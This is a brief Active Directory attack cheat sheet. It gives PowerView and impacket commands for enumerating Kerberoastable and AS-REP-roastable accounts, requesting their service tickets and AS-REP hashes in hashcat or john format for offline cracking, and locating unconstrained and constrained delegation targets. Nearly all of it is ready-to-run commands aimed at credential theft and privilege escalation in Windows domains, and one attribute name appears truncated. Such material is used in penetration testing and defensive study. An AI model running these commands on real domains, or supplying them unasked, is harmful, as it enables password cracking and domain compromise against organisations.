

1. Searching for Kerberoastable accounts  with PowerView : 
```powershell
Get-DomainUser -SPN | select name,serviceprincipalname
```


2. Searching for kerberoastable accounts with impacket : 
```python
impacket-GetUserSPNs  <domain_name>/<domain_user>:<domain_user_password> -request  -outputfile <output_TGSs_file>
```


3. searching for ASREPRoastable accounts with PowerView:
```powershell
Get-DomainUser -PreauthNotRequired | select name
```


4. Searching for ASREPRoastable accounts using impacket : 
```python
impacket-GetNPUsers <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]>
```


5. Looking for Servers with Unconstrained delegation enabled, if it is we have admin on the server:
```powershell
Get-DomainComputer -Unconstrained
```


6. Look for users or computers with Constrained Delegation,  If available  and you have user/computer hash, access :
```powershell
Get-DomainUser -TrustedToAuth | select userprincipalname
Get-DomainComputer -TrustedToAuth | select name,msds-all
```




